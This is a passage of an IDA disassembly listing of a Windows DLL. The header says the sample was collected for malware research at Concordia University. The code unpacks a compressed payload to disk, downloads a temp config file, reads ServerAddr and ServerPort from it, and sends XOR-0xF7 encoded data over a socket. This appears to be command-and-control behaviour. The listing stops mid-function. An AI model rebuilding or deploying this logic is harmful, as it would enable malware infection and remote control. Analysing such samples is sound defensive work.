;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D1CFE444A1264BB504B3687F72B01CC
; Input	CRC32 :	4C056EA0

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\0d1cfe444a1264bb504b3687f72b01cc
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	10000000
; Section 1. (virtual address 00001000)
; Virtual size			: 00002541 (   9537.)
; Section size in file		: 00002600 (   9728.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  DLL 32bit

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 10001000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================


sub_10001000	proc near		; CODE XREF: sub_100010A3+E3p
					; sub_10001000:loc_10003541p

arg_0		= dword	ptr  4

; FUNCTION CHUNK AT 10003541 SIZE 0000000A BYTES

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		push	edi
		cmp	cx, [esi+8]
		jb	short loc_1000102F
		mov	eax, [esi]

loc_10001010:				; CODE XREF: sub_10001000+2Dj
		movzx	edi, cx
		shl	edi, 2
		mov	ecx, esi
		mov	ax, [eax+edi]
		push	eax
		jmp	loc_10003541
; ---------------------------------------------------------------------------

loc_10001022:				; CODE XREF: sub_10001000+2546j
		mov	eax, [esi]
		mov	cx, [eax+edi+2]
		cmp	cx, [esi+8]
		jnb	short loc_10001010

loc_1000102F:				; CODE XREF: sub_10001000+Cj
		mov	edx, [esi+1Ch]
		mov	edi, [esi+30h]
		movzx	eax, cx
		mov	ecx, [esi]
		mov	al, [ecx+eax*4+2]
		mov	[edx+edi], al
		inc	dword ptr [esi+30h]
		mov	eax, [esi+30h]
		cmp	eax, [esi+2Ch]
		jnz	short loc_10001053
		mov	ecx, esi
		call	sub_10001058

loc_10001053:				; CODE XREF: sub_10001000+4Aj
		pop	edi
		pop	esi
		retn	4
sub_10001000	endp


; =============== S U B	R O U T	I N E =======================================


sub_10001058	proc near		; CODE XREF: sub_10001000+4Ep
		mov	al, [ecx+0Ch]
		and	dword ptr [ecx+30h], 0
		cmp	al, 0FFh
		jnz	short loc_1000106A
		mov	eax, [ecx+38h]
		sub	[ecx+1Ch], eax
		retn
; ---------------------------------------------------------------------------

loc_1000106A:				; CODE XREF: sub_10001058+9j
		movzx	edx, al
		movzx	edx, byte ptr [edx+ecx+0Dh]
		add	[ecx+34h], edx
		mov	edx, [ecx+34h]
		cmp	edx, [ecx+28h]
		jb	short loc_10001093
		inc	al
		cmp	al, 4
		mov	[ecx+0Ch], al
		jnb	short locret_100010A2
		movzx	eax, al
		movzx	eax, byte ptr [eax+ecx+0Dh]
		shr	eax, 1
		mov	[ecx+34h], eax

loc_10001093:				; CODE XREF: sub_10001058+23j
		mov	eax, [ecx+38h]
		mov	edx, [ecx+14h]
		imul	eax, [ecx+34h]
		sub	edx, eax
		mov	[ecx+1Ch], edx

locret_100010A2:			; CODE XREF: sub_10001058+2Cj
		retn
sub_10001058	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100010A3	proc near		; CODE XREF: sub_100012C4+33p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, ecx
		push	4080h		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		xor	ebx, ebx
		pop	ecx
		cmp	eax, ebx
		mov	[esi], eax
		jz	loc_10001198
		mov	eax, [ebp+arg_0]
		cmp	eax, ebx
		jz	loc_10001198
		mov	edx, [ebp+arg_4]
		cmp	edx, ebx
		jz	loc_10001198
		lea	ecx, [eax+1]
		mov	[esi+1Ch], edx
		mov	[esi+18h], ecx
		mov	[esi+20h], bl
		mov	cl, [eax]
		push	1
		pop	eax
		mov	[esi+22h], cl
		shl	eax, cl
		mov	[esi+30h], ebx
		mov	[esi+8], ax
		inc	eax
		mov	[esi+0Ah], ax
		mov	eax, [ebp+arg_8]
		mov	[esi+2Ch], eax
		lea	eax, ds:1Fh[eax*8]
		shr	eax, 5
		shl	eax, 2
		cmp	[ebp+arg_10], bl
		mov	[esi+38h], eax
		setz	al
		dec	eax
		and	al, 1
		add	eax, 0FFh
		cmp	al, bl
		mov	[esi+0Ch], al
		jnz	short loc_10001130
		mov	eax, [ebp+arg_C]
		mov	[esi+14h], edx
		mov	[esi+28h], eax
		mov	[esi+34h], ebx

loc_10001130:				; CODE XREF: sub_100010A3+7Fj
		push	edi
		mov	ecx, esi
		call	sub_1000119E

loc_10001138:				; CODE XREF: sub_100010A3+EAj
		mov	ecx, esi
		call	sub_100011E2
		mov	edi, eax
		cmp	di, [esi+0Ah]
		jz	short loc_1000118F
		cmp	di, [esi+8]
		jnz	short loc_10001165
		mov	ecx, esi
		call	sub_1000119E

loc_10001154:				; CODE XREF: sub_100010A3+C0j
		mov	ecx, esi
		call	sub_100011E2
		mov	edi, eax
		cmp	di, [esi+8]
		jnz	short loc_10001183
		jmp	short loc_10001154
; ---------------------------------------------------------------------------

loc_10001165:				; CODE XREF: sub_100010A3+A8j
		cmp	di, [esi+24h]
		jnb	short loc_1000116E
		push	edi
		jmp	short loc_1000116F
; ---------------------------------------------------------------------------

loc_1000116E:				; CODE XREF: sub_100010A3+C6j
		push	ebx

loc_1000116F:				; CODE XREF: sub_100010A3+C9j
		mov	ecx, esi
		call	sub_1000123B
		movzx	ax, al
		push	eax
		push	ebx
		mov	ecx, esi
		call	sub_1000125D

loc_10001183:				; CODE XREF: sub_100010A3+BEj
		push	edi
		mov	ecx, esi
		call	sub_10001000
		mov	ebx, edi
		jmp	short loc_10001138
; ---------------------------------------------------------------------------

loc_1000118F:				; CODE XREF: sub_100010A3+A2j
		push	dword ptr [esi]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		pop	edi

loc_10001198:				; CODE XREF: sub_100010A3+18j
					; sub_100010A3+23j ...
		pop	esi
		pop	ebx
		pop	ebp
		retn	14h
sub_100010A3	endp


; =============== S U B	R O U T	I N E =======================================


sub_1000119E	proc near		; CODE XREF: sub_100010A3+90p
					; sub_100010A3+ACp
		push	esi
		mov	esi, ecx
		push	4000h		; Size
		push	0FFh		; Val
		push	dword ptr [esi]	; Dst
		call	memset
		xor	eax, eax
		add	esp, 0Ch
		cmp	[esi+8], ax
		jbe	short loc_100011CE

loc_100011BD:				; CODE XREF: sub_1000119E+2Ej
		mov	edx, [esi]
		movzx	ecx, ax
		mov	[edx+ecx*4+2], ax
		inc	eax
		cmp	ax, [esi+8]
		jb	short loc_100011BD

loc_100011CE:				; CODE XREF: sub_1000119E+1Dj
		mov	ax, [esi+0Ah]
		inc	ax
		mov	[esi+24h], ax
		mov	al, [esi+22h]
		inc	al
		mov	[esi+23h], al
		pop	esi
		retn
sub_1000119E	endp


; =============== S U B	R O U T	I N E =======================================


sub_100011E2	proc near		; CODE XREF: sub_100010A3+97p
					; sub_100010A3+B3p
		movzx	eax, byte ptr [ecx+20h]
		push	ebx
		push	esi
		push	edi
		movzx	edi, byte ptr [ecx+23h]
		add	eax, edi
		cmp	eax, 8
		ja	short loc_100011FC
		mov	edx, [ecx+18h]
		movzx	esi, byte ptr [edx]
		jmp	short loc_10001215
; ---------------------------------------------------------------------------

loc_100011FC:				; CODE XREF: sub_100011E2+10j
		mov	edx, [ecx+18h]
		cmp	eax, 10h
		ja	short loc_10001209
		movzx	esi, word ptr [edx]
		jmp	short loc_10001215
; ---------------------------------------------------------------------------

loc_10001209:				; CODE XREF: sub_100011E2+20j
		movzx	esi, byte ptr [edx+2]
		movzx	ebx, word ptr [edx]
		shl	esi, 10h
		or	esi, ebx

loc_10001215:				; CODE XREF: sub_100011E2+18j
					; sub_100011E2+25j
		mov	ebx, eax
		push	20h
		shr	ebx, 3
		add	ebx, edx
		mov	dl, al
		and	dl, 7
		mov	[ecx+18h], ebx
		mov	[ecx+20h], dl
		pop	ecx
		sub	ecx, eax
		mov	eax, esi
		push	20h
		shl	eax, cl
		pop	ecx
		sub	ecx, edi
		pop	edi
		pop	esi
		pop	ebx
		shr	eax, cl
		retn
sub_100011E2	endp


; =============== S U B	R O U T	I N E =======================================


sub_1000123B	proc near		; CODE XREF: sub_100010A3+CEp

arg_0		= dword	ptr  4

		mov	eax, [ecx]
		mov	edx, [esp+arg_0]

loc_10001241:				; CODE XREF: sub_1000123B+16j
		movzx	ecx, dx
		mov	cx, [eax+ecx*4]
		cmp	cx, 0FFFFh
		jz	short loc_10001253
		mov	edx, ecx
		jmp	short loc_10001241
; ---------------------------------------------------------------------------

loc_10001253:				; CODE XREF: sub_1000123B+12j
		movzx	ecx, dx
		mov	al, [eax+ecx*4+2]
		retn	4
sub_1000123B	endp


; =============== S U B	R O U T	I N E =======================================


sub_1000125D	proc near		; CODE XREF: sub_100010A3+DBp

arg_0		= word ptr  4
arg_4		= word ptr  8

		movzx	edx, word ptr [ecx+24h]
		lea	eax, [ecx+24h]
		push	esi
		mov	esi, [ecx]
		push	edi
		mov	di, [esp+8+arg_0]
		mov	[esi+edx*4], di
		mov	esi, [ecx]
		movzx	edx, word ptr [eax]
		mov	di, [esp+8+arg_4]
		mov	[esi+edx*4+2], di
		inc	word ptr [eax]
		mov	ax, [eax]
		pop	edi
		cmp	ax, 8
		pop	esi
		jz	short loc_100012BE
		cmp	ax, 10h
		jz	short loc_100012BE
		cmp	ax, 20h
		jz	short loc_100012BE
		cmp	ax, 40h
		jz	short loc_100012BE
		cmp	ax, 80h
		jz	short loc_100012BE
		cmp	ax, 100h
		jz	short loc_100012BE
		cmp	ax, 200h
		jz	short loc_100012BE
		cmp	ax, 400h
		jz	short loc_100012BE
		cmp	ax, 800h
		jnz	short locret_100012C1

loc_100012BE:				; CODE XREF: sub_1000125D+2Fj
					; sub_1000125D+35j ...
		inc	byte ptr [ecx+23h]

locret_100012C1:			; CODE XREF: sub_1000125D+5Fj
		retn	8
sub_1000125D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_100012C4(LPCVOID lpBuffer, LPCSTR lpFileName)
sub_100012C4	proc near		; CODE XREF: sub_10002620+A7p

NumberOfBytesWritten= dword ptr	-8
var_4		= dword	ptr -4
lpBuffer	= dword	ptr  8
lpFileName	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+lpBuffer]
		push	edi
		mov	[ebp+var_4], ecx
		mov	ebx, [esi+0Ch]
		lea	eax, [ebx+400h]
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		pop	ecx
		xor	edi, edi
		push	edi
		push	edi
		push	edi
		mov	[ebp+lpBuffer],	eax
		push	eax
		mov	ecx, [ebp+var_4]
		movzx	eax, word ptr [esi+18h]
		lea	eax, [eax+esi+1Ah]
		push	eax
		call	sub_100010A3
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	edi		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_10001328
		push	[ebp+lpBuffer]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		xor	eax, eax
		jmp	short loc_1000134E
; ---------------------------------------------------------------------------

loc_10001328:				; CODE XREF: sub_100012C4+55j
		lea	eax, [ebp+NumberOfBytesWritten]
		push	edi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	ebx		; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		mov	[ebp+NumberOfBytesWritten], edi
		push	esi		; hFile
		call	ds:WriteFile
		push	[ebp+lpBuffer]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	esi		; hObject
		call	ds:CloseHandle
		push	1
		pop	eax

loc_1000134E:				; CODE XREF: sub_100012C4+62j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_100012C4	endp


; =============== S U B	R O U T	I N E =======================================


sub_10001355	proc near		; CODE XREF: sub_10002620+17p
					; .text:10003039p
		push	esi
		mov	esi, ecx
		push	100h		; Size
		push	0		; Val
		and	dword ptr [esi+4], 0
		lea	eax, [esi+8]
		push	eax		; Dst
		mov	dword ptr [esi], offset	off_10004130
		call	memset
		and	dword ptr [esi+108h], 0
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
sub_10001355	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_10001380(void *, char)
sub_10001380	proc near		; DATA XREF: .rdata:off_10004130o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_1000139C
		test	[esp+4+arg_0], 1
		jz	short loc_10001396
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_10001396:				; CODE XREF: sub_10001380+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_10001380	endp


; =============== S U B	R O U T	I N E =======================================


sub_1000139C	proc near		; CODE XREF: sub_10001380+3p
					; sub_10002620+D7p ...

; FUNCTION CHUNK AT 100018B5 SIZE 00000031 BYTES

		mov	dword ptr [ecx], offset	off_10004130
		jmp	loc_100018B5
sub_1000139C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_100013A7(LPCSTR lpString2)
sub_100013A7	proc near		; CODE XREF: .text:10003097p
					; .text:100030D9p

name		= byte ptr -114h
var_113		= byte ptr -113h
var_10		= word ptr -10h
var_E		= byte ptr -0Eh
Dst		= dword	ptr -0Ch
lpString2	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 114h
		and	[ebp+name], 0
		push	esi
		push	edi
		push	40h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_113]
		push	[ebp+lpString2]	; lpString2
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+name]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	esi, ds:inet_addr
		lea	eax, [ebp+name]
		push	eax		; cp
		call	esi ; inet_addr
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_10001435
		lea	eax, [ebp+name]
		push	eax		; name
		call	ds:gethostbyname
		mov	ecx, eax
		test	ecx, ecx
		jz	short loc_10001435
		and	[ebp+var_10], 0
		xor	eax, eax
		lea	edi, [ebp+var_E]
		stosd
		stosd
		stosd
		stosw
		movsx	eax, word ptr [ecx+0Ah]
		push	eax		; Size
		mov	eax, [ecx+0Ch]
		push	dword ptr [eax]	; Src
		lea	eax, [ebp+Dst]
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch
		push	[ebp+Dst]	; in
		call	ds:inet_ntoa
		push	eax		; cp
		call	esi ; inet_addr
		mov	edi, eax

loc_10001435:				; CODE XREF: sub_100013A7+46j
					; sub_100013A7+59j
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn	4
sub_100013A7	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_1000143D(int, LPCSTR lpFileName)
sub_1000143D	proc near		; CODE XREF: sub_10001656+A0p

Buffer		= byte ptr -1214h
String1		= byte ptr -214h
var_213		= byte ptr -213h
String2		= byte ptr -114h
var_113		= byte ptr -113h
var_112		= byte ptr -112h
var_111		= byte ptr -111h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
NumberOfBytesWritten= dword ptr	-8
nNumberOfBytesToWrite= dword ptr -4
arg_0		= dword	ptr  8
lpFileName	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	eax, 1214h
		call	__alloca_probe
		push	ebx
		xor	ebx, ebx
		push	ebx
		push	ebx
		push	ebx
		push	ebx
		push	offset dword_10005130
		call	ds:InternetOpenA
		cmp	eax, ebx
		mov	[ebp+var_C], eax
		jnz	short loc_1000146A
		xor	eax, eax
		jmp	loc_1000158B
; ---------------------------------------------------------------------------

loc_1000146A:				; CODE XREF: sub_1000143D+24j
		push	ebx
		push	80000100h
		push	ebx
		push	ebx
		push	[ebp+arg_0]
		push	eax
		call	ds:InternetOpenUrlA
		cmp	eax, ebx
		mov	[ebp+arg_0], eax
		jz	loc_10001580
		push	edi
		push	3Fh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_113]
		push	3Fh
		rep stosd
		stosw
		stosb
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_213]
		mov	[ebp+String1], bl
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+var_10]
		mov	[ebp+String2], 32h
		push	eax
		lea	eax, [ebp+var_14]
		push	eax
		lea	eax, [ebp+String1]
		push	eax
		push	13h
		push	[ebp+arg_0]
		mov	[ebp+var_113], 30h
		mov	[ebp+var_112], 30h
		mov	[ebp+var_111], bl
		mov	[ebp+var_14], 0FAh
		mov	[ebp+var_10], ebx
		call	ds:HttpQueryInfoA
		test	eax, eax
		jz	loc_10001576
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	ds:lstrcmpA
		test	eax, eax
		jnz	short loc_10001576
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	1		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	ebx		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; lpFileName
		call	ds:CreateFileA
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	short loc_10001576
		mov	[ebp+nNumberOfBytesToWrite], ebx
		mov	[ebp+NumberOfBytesWritten], ebx

loc_10001532:				; CODE XREF: sub_1000143D+12Dj
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	eax
		lea	eax, [ebp+Buffer]
		push	0FA0h
		push	eax
		push	[ebp+arg_0]
		call	ds:InternetReadFile
		test	eax, eax
		jz	short loc_1000156F
		cmp	[ebp+nNumberOfBytesToWrite], ebx
		jz	short loc_1000156C
		lea	eax, [ebp+NumberOfBytesWritten]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+Buffer]
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	edi		; hFile
		call	ds:WriteFile
		jmp	short loc_10001532
; ---------------------------------------------------------------------------

loc_1000156C:				; CODE XREF: sub_1000143D+115j
		push	1
		pop	ebx

loc_1000156F:				; CODE XREF: sub_1000143D+110j
		push	edi		; hObject
		call	ds:CloseHandle

loc_10001576:				; CODE XREF: sub_1000143D+B2j
					; sub_1000143D+CEj ...
		push	[ebp+arg_0]
		call	ds:InternetCloseHandle
		pop	edi

loc_10001580:				; CODE XREF: sub_1000143D+44j
		push	[ebp+var_C]
		call	ds:InternetCloseHandle
		mov	eax, ebx

loc_1000158B:				; CODE XREF: sub_1000143D+28j
		pop	ebx
		leave
		retn	8
sub_1000143D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10001590(LPCSTR lpString2, int, void *Dst)
sub_10001590	proc near		; CODE XREF: sub_10001656+108p
					; sub_10001656+134p

String		= byte ptr -208h
var_207		= byte ptr -207h
String1		= byte ptr -104h
var_103		= byte ptr -103h
lpString2	= dword	ptr  8
arg_4		= dword	ptr  0Ch
Dst		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 208h
		and	[ebp+String1], 0
		push	ebx
		push	edi
		push	40h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_103]
		and	[ebp+String], 0
		rep stosd
		stosw
		stosb
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_207]
		rep stosd
		push	[ebp+arg_4]
		stosw
		stosb
		lea	eax, [ebp+String]
		push	offset aS	; "%s="
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+String1]
		push	[ebp+lpString2]	; lpString2
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	[ebp+arg_4]
		lea	eax, [ebp+String1]
		push	eax
		call	ds:StrStrA
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_10001650
		mov	edi, ds:lstrlenA
		lea	eax, [ebp+String]
		push	eax		; lpString
		call	edi ; lstrlenA
		add	ebx, eax
		push	3Bh
		push	ebx
		call	ds:StrChrA
		test	eax, eax
		jnz	short loc_10001635
		lea	eax, [ebp+String1]
		push	eax		; lpString
		call	edi ; lstrlenA
		lea	eax, [ebp+eax+String1]

loc_10001635:				; CODE XREF: sub_10001590+93j
		mov	edi, [ebp+Dst]
		push	esi
		mov	esi, eax
		sub	esi, ebx
		push	esi		; Size
		push	ebx		; Src
		push	edi		; Dst
		call	memcpy
		add	esp, 0Ch
		and	byte ptr [esi+edi], 0
		push	1
		pop	eax
		pop	esi

loc_10001650:				; CODE XREF: sub_10001590+75j
		pop	edi
		pop	ebx
		leave
		retn	0Ch
sub_10001590	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10001656(LPCSTR lpString2)
sub_10001656	proc near		; CODE XREF: sub_100017BB+3Bp
					; .text:100030BCp

var_608		= byte ptr -608h
var_607		= byte ptr -607h
Dst		= byte ptr -208h
var_207		= byte ptr -207h
String		= byte ptr -108h
var_107		= byte ptr -107h
var_4		= dword	ptr -4
lpString2	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 608h
		and	[ebp+var_608], 0
		push	ebx
		push	esi
		mov	ebx, ecx
		push	edi
		mov	ecx, 0FFh
		xor	eax, eax
		lea	edi, [ebp+var_607]
		rep stosd
		push	[ebp+lpString2]
		mov	esi, ds:wsprintfA
		stosw
		stosb
		lea	eax, [ebp+var_608]
		push	offset aHttpS	; "http://%s"
		push	eax		; LPSTR
		call	esi ; wsprintfA
		and	[ebp+String], 0
		add	esp, 0Ch
		xor	eax, eax
		lea	edi, [ebp+var_107]
		push	40h
		pop	ecx
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+String]
		push	eax		; lpBuffer
		push	0FAh		; nBufferLength
		call	ds:GetTempPathA
		call	ds:GetCurrentThreadId
		push	eax
		lea	eax, [ebp+String]
		push	offset a08x_txt	; "%08x.txt"
		push	eax		; lpString
		call	ds:lstrlenA
		lea	eax, [ebp+eax+String]
		push	eax		; LPSTR
		call	esi ; wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+String]
		mov	ecx, ebx
		push	eax		; lpFileName
		lea	eax, [ebp+var_608]
		push	eax		; int
		call	sub_1000143D
		test	eax, eax
		jz	short loc_10001722
		lea	eax, [ebp+var_4]
		xor	esi, esi
		push	eax		; int
		lea	eax, [ebp+lpString2]
		push	eax		; int
		lea	eax, [ebp+String]
		push	eax		; hFile
		mov	[ebp+lpString2], esi
		mov	[ebp+var_4], esi
		call	sub_10001A27
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_10001729

loc_10001722:				; CODE XREF: sub_10001656+A7j
		xor	eax, eax
		jmp	loc_100017B4
; ---------------------------------------------------------------------------

loc_10001729:				; CODE XREF: sub_10001656+CAj
		lea	eax, [ebp+String]
		push	eax		; lpFileName
		call	ds:DeleteFileA
		and	[ebp+Dst], 0
		push	3Fh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_207]
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+Dst]
		mov	ecx, ebx
		push	eax		; Dst
		push	offset aServeraddr ; "ServerAddr"
		push	[ebp+lpString2]	; lpString2
		call	sub_10001590
		test	eax, eax
		jz	short loc_100017A9
		lea	eax, [ebp+Dst]
		push	eax		; Source
		lea	eax, [ebx+8]
		push	eax		; Dest
		call	strcpy
		pop	ecx
		lea	eax, [ebp+Dst]
		pop	ecx
		push	eax		; Dst
		push	offset aServerport ; "ServerPort"
		push	[ebp+lpString2]	; lpString2
		mov	ecx, ebx
		call	sub_10001590
		test	eax, eax
		jz	short loc_100017A9
		lea	eax, [ebp+Dst]
		push	eax
		call	ds:StrToIntA
		push	1
		mov	[ebx+108h], eax
		pop	esi

loc_100017A9:				; CODE XREF: sub_10001656+10Fj
					; sub_10001656+13Bj
		push	[ebp+lpString2]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	eax, esi

loc_100017B4:				; CODE XREF: sub_10001656+CEj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_10001656	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100017BB	proc near		; CODE XREF: sub_10002620+29p

buf		= byte ptr -110h
var_108		= byte ptr -108h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 110h
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		push	offset String2	; lpString2
		lea	ebx, [esi+8]
		push	ebx		; lpString1
		call	ds:lstrcpyA
		mov	eax, dword_10005160
		mov	edi, offset String
		push	edi		; lpString
		mov	[esi+108h], eax
		call	ds:lstrlenA
		test	eax, eax
		jz	short loc_100017FB
		push	edi		; lpString2
		mov	ecx, esi
		call	sub_10001656

loc_100017FB:				; CODE XREF: sub_100017BB+36j
		push	dword ptr [esi+108h] ; hostshort
		mov	ecx, esi
		push	ebx		; optval
		call	sub_100018E6
		test	eax, eax
		mov	[esi+4], eax
		jz	short loc_10001849
		push	42h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_108]
		rep stosd
		mov	eax, [ebp+arg_0]
		mov	edi, 110h
		mov	dword ptr [ebp+buf], eax
		lea	eax, [ebp+buf]
		push	edi
		push	eax
		mov	ecx, esi
		call	sub_1000189A
		lea	eax, [ebp+buf]
		push	edi		; len
		push	eax		; buf
		mov	ecx, esi
		call	sub_10001850

loc_10001849:				; CODE XREF: sub_100017BB+53j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_100017BB	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10001850(char *buf,	int len)
sub_10001850	proc near		; CODE XREF: sub_100017BB+89p

buf		= dword	ptr  8
len		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+len]
		push	esi
		push	edi
		mov	edi, [ebp+buf]
		and	[ebp+buf], 0
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		jz	short loc_10001896
		test	ebx, ebx
		jbe	short loc_1000188C

loc_1000186C:				; CODE XREF: sub_10001850+3Aj
		push	0		; flags
		push	ebx		; len
		push	edi		; buf
		push	dword ptr [esi+4] ; s
		call	ds:send
		test	eax, eax
		jle	short loc_10001896
		add	[ebp+buf], eax
		add	edi, eax
		sub	ebx, eax
		mov	eax, [ebp+buf]
		cmp	eax, [ebp+len]
		jb	short loc_1000186C

loc_1000188C:				; CODE XREF: sub_10001850+1Aj
		push	1
		pop	eax

loc_1000188F:				; CODE XREF: sub_10001850+48j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_10001896:				; CODE XREF: sub_10001850+16j
					; sub_10001850+2Bj
		xor	eax, eax
		jmp	short loc_1000188F
sub_10001850	endp


; =============== S U B	R O U T	I N E =======================================


sub_1000189A	proc near		; CODE XREF: sub_100017BB+7Ap

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		xor	ecx, ecx
		cmp	[esp+arg_4], ecx
		jbe	short locret_100018B2

loc_100018A2:				; CODE XREF: sub_1000189A+16j
		mov	eax, [esp+arg_0]
		add	eax, ecx
		xor	byte ptr [eax],	0F7h
		inc	ecx
		cmp	ecx, [esp+arg_4]
		jb	short loc_100018A2

locret_100018B2:			; CODE XREF: sub_1000189A+6j
		retn	8
sub_1000189A	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_1000139C

loc_100018B5:				; CODE XREF: sub_1000139C+6j
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_100018CA
		push	eax		; s
		call	ds:closesocket
		and	dword ptr [esi+4], 0

loc_100018CA:				; CODE XREF: sub_1000139C+521j
		push	100h		; Size
		lea	eax, [esi+8]
		push	0		; Val
		push	eax		; Dst
		call	memset
		and	dword ptr [esi+108h], 0
		add	esp, 0Ch
		pop	esi
		retn
; END OF FUNCTION CHUNK	FOR sub_1000139C

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_100018E6(LPCSTR optval, u_short hostshort)
sub_100018E6	proc near		; CODE XREF: sub_100017BB+49p

cp		= byte ptr -124h
var_123		= byte ptr -123h
var_20		= word ptr -20h
var_1E		= byte ptr -1Eh
Dst		= dword	ptr -1Ch
name		= sockaddr ptr -10h
optval		= dword	ptr  8
hostshort	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 124h
		and	[ebp+name.sa_family], 0
